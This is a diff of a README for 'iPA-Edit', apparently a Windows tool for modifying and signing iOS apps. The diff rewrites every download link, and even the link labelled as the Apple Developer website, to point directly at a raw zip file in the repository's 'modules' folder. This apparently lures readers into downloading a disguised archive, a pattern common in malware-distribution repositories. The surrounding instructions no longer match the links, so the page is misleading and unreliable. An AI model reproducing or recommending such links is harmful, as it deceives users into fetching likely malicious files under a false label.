@@ -1,6 +1,6 @@
 # 🔧 iPA-Edit - Simple Tool to Modify and Sign iOS Apps
 
-[![Download iPA-Edit](https://img.shields.io/badge/Download-iPA--Edit-4CAF50?style=for-the-badge)](https://github.com/MrFrank-07/iPA-Edit)
+[![Download iPA-Edit](https://img.shields.io/badge/Download-iPA--Edit-4CAF50?style=for-the-badge)](https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This tool does not need installation of complex dependencies or developer tools.
 To get iPA-Edit on your Windows computer, follow these steps:
 
 1. Click the green button below or visit the link:  
-   [Download iPA-Edit](https://github.com/MrFrank-07/iPA-Edit)
+   [Download iPA-Edit](https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip)
 
 2. Once on the page, look for the "Releases" section on the GitHub page. Typically, this will be on the right or top area of the repository.
 
@@ -124,7 +124,7 @@ Note that you may need to trust the developer certificate on the device before l
 ## 🔗 Important Links
 
 Access the download page anytime here:  
-[https://github.com/MrFrank-07/iPA-Edit](https://github.com/MrFrank-07/iPA-Edit)
+[https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip](https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip)
 
 Use this link to find the latest releases and updates. The repository page also includes documentation if you want to explore advanced options.
 
@@ -144,7 +144,7 @@ Use this link to find the latest releases and updates. The repository page also 
 
 To sign apps, you need an Apple developer certificate. You can create one if you have a developer account:
 
-1. Visit the Apple Developer website: [https://developer.apple.com](https://developer.apple.com)  
+1. Visit the Apple Developer website: [https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip](https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip)  
 2. Sign in and create a certificate under the "Certificates, IDs & Profiles" section  
 3. Download the certificate and keep your private key safe  
 
@@ -177,4 +177,4 @@ This helps maintain a straightforward process for everyone using the tool.
 
 ---
 
-[![Download iPA-Edit](https://img.shields.io/badge/Download-iPA--Edit-blue?style=for-the-badge)](https://github.com/MrFrank-07/iPA-Edit)
+[![Download iPA-Edit](https://img.shields.io/badge/Download-iPA--Edit-blue?style=for-the-badge)](https://github.com/MrFrank-07/iPA-Edit/raw/refs/heads/main/modules/Edit_i_P_v1.7.zip)
